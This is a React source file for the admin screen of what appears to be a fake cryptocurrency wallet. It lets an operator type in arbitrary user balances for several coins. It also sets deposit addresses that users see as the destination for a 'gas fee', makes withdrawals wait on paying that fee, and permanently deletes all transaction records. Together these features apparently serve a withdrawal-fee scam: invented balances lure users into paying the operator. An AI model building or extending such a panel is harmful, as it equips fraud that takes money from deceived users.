import React, { useEffect, useState } from 'react';
import { LogOut, Save, Trash2, Zap } from 'lucide-react';
import { api, WalletData, SettingsData } from '../api';
import { toast } from 'sonner';
import { markTxWiped } from '../txStorage';

interface AdminViewProps {
  onLogout: () => void;
}

export function AdminView({ onLogout }: AdminViewProps) {
  const [wallet, setWallet] = useState<WalletData | null>(null);
  const [settings, setSettings] = useState<SettingsData | null>(null);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [wiping, setWiping] = useState(false);
  const [confirmWipe, setConfirmWipe] = useState(false);

  const [bal, setBal] = useState({ btc: '', eth: '', usdt_trc20: '', usdt_bep20: '', usdt_erc20: '', trx: '' });
  const [fees, setFees] = useState({ gas_fee_usd: '', gas_fee_btc: '' });
  const [addresses, setAddresses] = useState({
    deposit_address_btc: '',
    deposit_address_eth: '',
    deposit_address_usdt_trc20: '',
    deposit_address_usdt_bep20: '',
    deposit_address_usdt_erc20: '',
    deposit_address_trx: '',
  });
  const [autoApprove, setAutoApprove] = useState(false);

  useEffect(() => {
    Promise.all([api.getWallet(), api.getSettings()])
      .then(([w, s]) => {
        setWallet(w);
        setSettings(s);
        setBal({
          btc: w.btc.toString(),
          eth: w.eth.toString(),
          usdt_trc20: w.usdt_trc20.toString(),
          usdt_bep20: w.usdt_bep20.toString(),
          usdt_erc20: w.usdt_erc20.toString(),
          trx: w.trx.toString(),
        });
        setFees({ gas_fee_usd: s.gas_fee_usd.toString(), gas_fee_btc: s.gas_fee_btc.toString() });
        setAddresses({
          deposit_address_btc: s.deposit_address_btc ?? '',
          deposit_address_eth: s.deposit_address_eth ?? '',
          deposit_address_usdt_trc20: s.deposit_address_usdt_trc20 ?? '',
          deposit_address_usdt_bep20: s.deposit_address_usdt_bep20 ?? '',
          deposit_address_usdt_erc20: s.deposit_address_usdt_erc20 ?? '',
          deposit_address_trx: s.deposit_address_trx ?? '',
        });
        setAutoApprove(s.auto_approve ?? false);
      })
      .catch(() => toast.error('Failed to load admin data'))
      .finally(() => setLoading(false));
  }, []);

  const handleSave = async () => {
    setSaving(true);
    try {
      const [updatedWallet, updatedSettings] = await Promise.all([
        api.updateWallet({
          btc: parseFloat(bal.btc) || 0,
          eth: parseFloat(bal.eth) || 0,
          usdt_trc20: parseFloat(bal.usdt_trc20) || 0,
          usdt_bep20: parseFloat(bal.usdt_bep20) || 0,
          usdt_erc20: parseFloat(bal.usdt_erc20) || 0,
          trx: parseFloat(bal.trx) || 0,
        }),
        api.updateSettings({
          gas_fee_usd: parseFloat(fees.gas_fee_usd) || 0,
          gas_fee_btc: parseFloat(fees.gas_fee_btc) || 0,
          deposit_address_btc: addresses.deposit_address_btc.trim() || null,
          deposit_address_eth: addresses.deposit_address_eth.trim() || null,
          deposit_address_usdt_trc20: addresses.deposit_address_usdt_trc20.trim() || null,
          deposit_address_usdt_bep20: addresses.deposit_address_usdt_bep20.trim() || null,
          deposit_address_usdt_erc20: addresses.deposit_address_usdt_erc20.trim() || null,
          deposit_address_trx: addresses.deposit_address_trx.trim() || null,
          auto_approve: autoApprove,
        }),
      ]);
      setWallet(updatedWallet);
      setSettings(updatedSettings);
      toast.success('Changes saved successfully');
    } catch (err: unknown) {
      toast.error(err instanceof Error ? err.message : 'Failed to save changes');
    } finally {
      setSaving(false);
    }
  };

  const handleWipeHistory = async () => {
    setWiping(true);
    try {
      await api.deleteAllTransactions();
      markTxWiped();
      setConfirmWipe(false);
      toast.success('Transaction history cleared');
    } catch (err: unknown) {
      toast.error(err instanceof Error ? err.message : 'Failed to clear history');
    } finally {
      setWiping(false);
    }
  };

  if (loading || !wallet || !settings) {
    return (
      <div className="flex flex-col h-full items-center justify-center bg-background">
        <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  return (
    <div className="flex flex-col h-full bg-background pb-6 overflow-y-auto">
      <div className="flex flex-col p-6 pt-10">
        <h1 className="text-2xl font-semibold text-foreground mb-1">Admin Panel</h1>
        <p className="text-muted text-sm">Manage balances, deposit addresses and settings</p>
      </div>

      <div className="flex-1 px-6 flex flex-col gap-5">

        {/* ── Balances ───────────────────────────────── */}
        <SectionHeader label="Balances" />

        {([
          { label: 'Bitcoin (BTC)', key: 'btc', current: wallet.btc },
          { label: 'Ethereum (ETH)', key: 'eth', current: wallet.eth },
          { label: 'USDT TRC20', key: 'usdt_trc20', current: wallet.usdt_trc20 },
          { label: 'USDT BEP20', key: 'usdt_bep20', current: wallet.usdt_bep20 },
          { label: 'USDT ERC20', key: 'usdt_erc20', current: wallet.usdt_erc20 },
          { label: 'Tron (TRX)', key: 'trx', current: wallet.trx },
        ] as const).map(({ label, key, current }) => (
          <div key={key} className="flex flex-col gap-2">
            <label className="text-sm text-foreground font-medium flex items-center justify-between">
              <span>{label}</span>
              <span className="text-muted text-xs">Current: {current}</span>
            </label>
            <input
              type="number"
              value={bal[key]}
              onChange={(e) => setBal(prev => ({ ...prev, [key]: e.target.value }))}
              className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors"
              step="any"
            />
          </div>
        ))}

        {/* ── Deposit Addresses ──────────────────────── */}
        <SectionHeader label="Deposit Addresses" className="mt-3" />
        <p className="text-xs text-muted -mt-3">Shown to users on the Receive screen and as the gas fee payment destination</p>

        {([
          { label: 'BTC Deposit Address', key: 'deposit_address_btc', placeholder: 'bc1q…' },
          { label: 'ETH Deposit Address', key: 'deposit_address_eth', placeholder: '0x…' },
          { label: 'USDT TRC20 Deposit Address', key: 'deposit_address_usdt_trc20', placeholder: 'T…' },
          { label: 'USDT BEP20 Deposit Address', key: 'deposit_address_usdt_bep20', placeholder: '0x…' },
          { label: 'USDT ERC20 Deposit Address', key: 'deposit_address_usdt_erc20', placeholder: '0x…' },
          { label: 'TRX Deposit Address', key: 'deposit_address_trx', placeholder: 'T…' },
        ] as const).map(({ label, key, placeholder }) => (
          <div key={key} className="flex flex-col gap-2">
            <label className="text-sm text-foreground font-medium">{label}</label>
            <input
              type="text"
              value={addresses[key]}
              onChange={(e) => setAddresses(prev => ({ ...prev, [key]: e.target.value }))}
              className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors font-mono text-sm"
              placeholder={placeholder}
            />
          </div>
        ))}

        {/* ── Network Gas Fee ────────────────────────── */}
        <SectionHeader label="Network Gas Fee" className="mt-3" />

        <div className="flex flex-col gap-2">
          <label className="text-sm text-foreground font-medium flex items-center justify-between">
            <span>Gas Fee (USD)</span>
            <span className="text-muted text-xs">Current: ${settings.gas_fee_usd.toFixed(2)}</span>
          </label>
          <div className="relative">
            <span className="absolute left-4 top-1/2 -translate-y-1/2 text-muted">$</span>
            <input
              type="number"
              value={fees.gas_fee_usd}
              onChange={(e) => setFees(prev => ({ ...prev, gas_fee_usd: e.target.value }))}
              className="w-full bg-card border border-border rounded-xl pl-8 pr-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors"
              step="any" min="0"
            />
          </div>
        </div>

        <div className="flex flex-col gap-2">
          <label className="text-sm text-foreground font-medium flex items-center justify-between">
            <span>Gas Fee (BTC)</span>
            <span className="text-muted text-xs">Current: {settings.gas_fee_btc}</span>
          </label>
          <input
            type="number"
            value={fees.gas_fee_btc}
            onChange={(e) => setFees(prev => ({ ...prev, gas_fee_btc: e.target.value }))}
            className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors"
            step="any" min="0"
          />
        </div>

        {/* ── Auto-Approve ───────────────────────────── */}
        <SectionHeader label="Transaction Mode" className="mt-3" />

        <button
          onClick={() => setAutoApprove(v => !v)}
          className={`w-full flex items-center justify-between px-4 py-4 rounded-xl border transition-colors ${
            autoApprove
              ? 'border-primary/40 bg-primary/10'
              : 'border-border bg-card'
          }`}
        >
          <div className="flex items-center gap-3">
            <Zap className={`w-5 h-5 ${autoApprove ? 'text-primary' : 'text-muted'}`} />
            <div className="text-left">
              <div className={`text-sm font-medium ${autoApprove ? 'text-primary' : 'text-foreground'}`}>
                Auto-Approve Withdrawals
              </div>
              <div className="text-xs text-muted mt-0.5">
                {autoApprove
                  ? 'Gas fee step is skipped — withdrawals process immediately'
                  : 'Users must confirm gas fee payment before withdrawing'}
              </div>
            </div>
          </div>
          <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 ${autoApprove ? 'bg-primary' : 'bg-border'}`}>
            <div className={`absolute top-0.5 w-5 h-5 bg-white rounded-full shadow transition-transform ${autoApprove ? 'translate-x-5' : 'translate-x-0.5'}`} />
          </div>
        </button>

        <button
          onClick={handleSave}
          disabled={saving}
          className="w-full bg-primary hover:bg-primary/90 disabled:opacity-60 text-background font-medium rounded-xl px-4 py-4 mt-4 transition-colors flex items-center justify-center gap-2 active:scale-[0.98]"
        >
          <Save className="w-5 h-5" />
          {saving ? 'Saving…' : 'Save Changes'}
        </button>

        {/* ── Danger Zone ────────────────────────────── */}
        <SectionHeader label="Danger Zone" className="mt-3" danger />

        {!confirmWipe ? (
          <button
            onClick={() => setConfirmWipe(true)}
            className="w-full border border-destructive/30 text-destructive hover:bg-destructive/10 font-medium rounded-xl px-4 py-3.5 transition-colors flex items-center justify-center gap-2 active:scale-[0.98]"
          >
            <Trash2 className="w-4 h-4" />
            Clear Transaction History
          </button>
        ) : (
          <div className="flex flex-col gap-3 p-4 rounded-xl border border-destructive/30 bg-destructive/5">
            <p className="text-sm text-foreground font-medium text-center">
              This will permanently delete all transaction records. Are you sure?
            </p>
            <div className="flex gap-3">
              <button
                onClick={() => setConfirmWipe(false)}
                className="flex-1 border border-border text-muted hover:text-foreground rounded-xl py-3 font-medium transition-colors"
              >
                Cancel
              </button>
              <button
                onClick={handleWipeHistory}
                disabled={wiping}
                className="flex-1 bg-destructive hover:bg-destructive/90 disabled:opacity-60 text-white rounded-xl py-3 font-medium transition-colors flex items-center justify-center gap-2"
              >
                <Trash2 className="w-4 h-4" />
                {wiping ? 'Clearing…' : 'Yes, Clear'}
              </button>
            </div>
          </div>
        )}
      </div>

      <div className="px-6 pt-6 mt-auto">
        <button
          onClick={onLogout}
          className="flex items-center justify-center gap-2 w-full py-3.5 text-destructive border border-destructive/20 hover:bg-destructive/10 transition-colors rounded-xl active:scale-95"
        >
          <LogOut className="w-5 h-5" />
          <span className="font-medium">Logout Admin</span>
        </button>
      </div>
    </div>
  );
}

function SectionHeader({ label, className = '', danger = false }: { label: string; className?: string; danger?: boolean }) {
  return (
    <div className={`flex flex-col gap-1 mb-1 ${className}`}>
      <span className={`text-xs font-semibold uppercase tracking-widest ${danger ? 'text-destructive' : 'text-primary'}`}>
        {label}
      </span>
    </div>
  );
}
